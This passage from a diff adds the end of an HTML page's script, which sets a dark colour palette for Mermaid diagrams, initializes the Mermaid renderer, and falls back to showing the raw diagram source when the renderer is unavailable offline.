+    nodeBorder:'#3a3b40',clusterBkg:'#131316',clusterBorder:'#2a2b30',
+    lineColor:'#8b8d94',textColor:'#e8e8ea',titleColor:'#ff8397',
+    edgeLabelBackground:'#131316',labelBackground:'#131316',
+    noteBkgColor:'#1f2024',noteTextColor:'#a4a6ac',noteBorderColor:'#2a2b30',
+    actorBkg:'#191a1d',actorBorder:'#3a3b40',actorTextColor:'#e8e8ea',
+    signalColor:'#a4a6ac',signalTextColor:'#e8e8ea',
+    labelBoxBkgColor:'#1f2024',labelBoxBorderColor:'#3a3b40',labelTextColor:'#e8e8ea',
+    loopTextColor:'#a4a6ac',altBackground:'#191a1d',
+    sectionBkgColor:'#1f2024',sectionBkgColor2:'#191a1d',altSectionBkgColor:'#131316',
+    taskBkgColor:'#1f2024',taskBorderColor:'#3a3b40',taskTextColor:'#e8e8ea',
+    taskTextDarkColor:'#e8e8ea',taskTextOutsideColor:'#a4a6ac',
+    activeTaskBkgColor:'#ff5d74',activeTaskBorderColor:'#ff8397',
+    doneTaskBkgColor:'#2a2b30',doneTaskBorderColor:'#3a3b40',
+    critBkgColor:'#3a2e18',critBorderColor:'#e0a355',
+    gridColor:'#2a2b30',todayLineColor:'#ff5d74',
+    transitionColor:'#8b8d94',stateBkg:'#191a1d',stateBorder:'#3a3b40'};
+  if(window.mermaid){
+    var v = dark()? DARK : LIGHT; v.fontFamily = FONT; v.fontSize = '13px';
+    mermaid.initialize({startOnLoad:true, securityLevel:'loose', theme:'base',
+      themeVariables:v, flowchart:{curve:'basis',useMaxWidth:false,htmlLabels:true},
+      sequence:{useMaxWidth:false}, gantt:{useMaxWidth:false}});
+  } else {
+    document.querySelectorAll('pre.mermaid').forEach(function(el){
+      el.classList.add('raw');
+      var n=document.createElement('div'); n.className='fignote';
+      n.textContent='Diagram source (renderer unavailable offline)';
+      el.parentNode.insertBefore(n, el);
+    });
+  }
+})();
+</script></body></html>
